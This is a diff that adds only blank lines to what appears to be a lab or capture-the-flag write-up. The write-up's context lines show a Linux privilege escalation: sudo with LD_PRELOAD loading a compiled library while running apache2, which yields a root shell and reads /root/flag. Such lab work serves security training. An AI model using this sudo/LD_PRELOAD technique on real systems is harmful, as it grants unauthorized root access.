@@ -2,6 +2,7 @@
 
     noobuser@attackdefense:~$ id
     uid=999(noobuser) gid=999(noobuser) groups=999(noobuser)
+    
     noobuser@attackdefense:~$ sudo -l
     Matching Defaults entries for noobuser on attackdefense:
         env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
@@ -27,12 +28,15 @@ then compile the file and generate the object file
     noobuser@attackdefense:~$ sudo LD_PRELOAD=/tmp/LD_PRELOAD_privesc.so /usr/sbin/apache2
     root@attackdefense:/tmp# id
     uid=0(root) gid=0(root) groups=0(root)
+    
     root@attackdefense:/tmp# find /root/ type f -name flag
     /root/flag
     find: 'type': No such file or directory
     find: 'f': No such file or directory
+    
     root@attackdefense:/tmp# cat /root/flag
     368b21993<snip>1ac697cc83
+    
     root@attackdefense:/tmp# yeayy
 
 
